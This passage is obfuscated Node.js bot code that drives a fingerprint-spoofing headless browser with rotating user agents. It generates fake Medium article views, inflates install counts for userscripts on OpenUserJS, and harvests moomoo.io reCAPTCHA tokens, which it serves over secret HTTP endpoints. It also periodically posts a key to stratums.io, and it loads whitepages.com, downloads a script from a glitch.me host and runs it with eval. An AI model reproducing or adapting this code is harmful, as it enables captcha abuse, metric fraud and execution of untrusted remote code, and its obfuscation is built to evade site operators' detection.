      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0xf) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x2) + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    X(0xd, 'y0*J') + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + W(0x15) + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x351 + 0x3e0 + -0x731
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Z = d;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x16 * -0x14b + -0xc91 * 0x1 + -0xfe1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + Z(0x11)](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x641 + 0x386 + 0x10b * -0x9), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0xe6 + 0x58a * -0x3 + -0xbf * -0x18), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xb * 0xa9 + 0x93 * -0x43 + 0xb6f * 0x4;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1ad8 + -0x9ad * -0x2 + -0x1 * -0x77e; w < getRandomInt(0xc56 + 0x148d + -0x7a * 0x45, 0x33b * -0x2 + 0x264d + 0x2 * -0xfe9); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x94db + -0x227 * -0x3 + 0x4f10);
        }
      }();
    }, 0x3 * 0xc59 + -0x163a + -0x3 * 0x4cf), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a1 = d;

      function u() {
        const a0 = c;
        axios['post']('https://st' + 'ratums.io/' + a0(0x19), {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x232f + 0x19da + 0x1 * 0x955;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x116 + -0x1f00 + -0x446 * -0x7, 0x35a * 0x9 + 0x503 + -0x22fb * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v[a1(0x10)](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xb856 + 0x87 * -0xe2 + 0x3408);
    }, -0x15b * 0x6 + -0x221d + 0x25 * 0x127), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0xba1 + -0x445 * 0x1 + -0xfe6 * -0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x8 * -0x3fb + 0x4f * 0x5e + 0xe8e), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x2651 + -0x6 * -0x47b + 0x1 * 0xb6f), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x1d92 * -0x9e + 0x1b168b * -0x1 + 0x3b1247 * 0x1);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x20f * 0x2 + -0x1a4f + 0x1ed1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x2146 + -0x2bf * 0x7 + -0xd45);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1 * -0x1f0d + 0x8a2 + 0x35fb);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c;
  async function f() {
    const a2 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x26cf + 0x2258 + 0x478) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x121 * -0x3 + -0x1ae7 + 0x1785));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x3e8 + 0xb * 0x2b + 0x20f, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * 0x2275 + 0x2 * 0x517 + 0x1847, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x3f72 + -0x1 * -0x2225 + 0x3a87 * -0x1),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': a2(0x13) + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x3963 + 0xb * -0x2c8 + 0x3 * 0x417),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + a3(0xb) + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
